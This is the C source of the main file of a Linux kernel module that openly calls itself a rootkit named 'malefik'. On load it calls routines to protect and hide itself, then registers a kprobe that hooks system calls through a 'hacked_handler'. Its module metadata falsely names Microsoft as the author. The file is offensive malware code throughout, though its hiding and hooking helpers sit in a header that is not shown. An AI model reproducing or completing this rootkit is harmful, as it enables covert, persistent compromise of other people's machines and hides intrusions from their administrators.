/*
 *	demonstrating that ~ Kernel is life
 */
#include "malefik.h"

/* INIT */
static int __init rootkit_init(void)
{
    #if DEBUG
    {
		pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ INIT...\n");
	}
	#endif

    protect_rootkit();
	hide_rootkit();

    int ret;
    ret = register_kprobe(&syscall_catch_kprobe);

    if (ret < 0)
    {
        #if DEBUG
        {
            pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Done. %d\n", ret);
        }
        #endif
        return ret;
    }

	#if DEBUG
	{
		pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ hacked_handler address: 0x%px \n", hacked_handler);
	}
	#endif

    return 0;
}


/* EXIT */
static void __exit rootkit_exit(void)
{
	#if DEBUG
	{
        pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Unregistering kprobe...\n");
	}
	#endif

    unregister_kprobe(&syscall_catch_kprobe);

	#if DEBUG
	{
        pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Done.\n");
        pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Unloaded\n");
	}
	#endif
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Microsoft");
MODULE_DESCRIPTION("Never gonna root you up");
MODULE_VERSION("6.6.6");
